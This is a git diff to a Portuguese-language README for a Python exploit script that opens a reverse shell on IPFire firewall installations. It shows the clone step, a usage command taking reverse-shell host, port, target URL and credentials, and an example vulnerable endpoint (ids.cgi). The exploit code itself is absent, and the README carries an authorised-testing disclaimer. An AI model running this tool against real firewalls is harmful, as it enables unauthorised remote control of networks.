@@ -1,6 +1,8 @@
 # IPFire Reverse Shell Exploit
 
-![Small Bypass](banner.png)
+![Small Bypass](https://github.com/BrotherOfJhonny/IPFire_2.19/assets/28454566/77343b75-287b-461c-9b44-bb0fb2849215)
+
+
 
 Este é um script em Python para explorar uma vulnerabilidade em instalações do IPFire que permite a execução de um shell reverso. Ele é destinado apenas para fins educacionais e de teste. Use com responsabilidade e apenas em ambientes onde você tem permissão.
 
@@ -16,16 +18,18 @@ Para usar o script, siga as instruções abaixo:
 1. Clone o repositório:
 
    ```bash
-   git clone https://github.com/seu-usuario/ipfire-reverse-shell-exploit.git
+   git clone [https://github.com/seu-usuario/ipfire-reverse-shell-exploit.git](https://github.com/BrotherOfJhonny/IPFire_2.19.git)
 
-2. Acesse a pasta
+2. Acesse a pasta:
 cd ipfire-reverse-shell-exploit
+
+3. Execute seguindo as intruções:
 
   ```bash
 python ipfireExpl3.py --revhost SEU_HOST --revport SUA_PORTA --url URL_VULNERAVEL --u SEU_USUARIO --p SUA_SENHA
  ```
 
-Substitua SEU_HOST, SUA_PORTA, URL_VULNERAVEL, SEU_USUARIO e SUA_SENHA pelos valores apropriados.
+Substitua SEU_HOST, SUA_PORTA, URL_VULNERAVEL,  ```exemplo: https://10.2.2.1:444/cgi-bin/ids.cgi ```, SEU_USUARIO e SUA_SENHA pelos valores apropriados.
 
 ## Aviso Legal
 Este script é fornecido apenas para fins educacionais e de teste. Não é destinado a uso malicioso. Use-o apenas em sistemas onde você tem permissão para testar a vulnerabilidade. O autor não é responsável por qualquer uso indevido deste script.
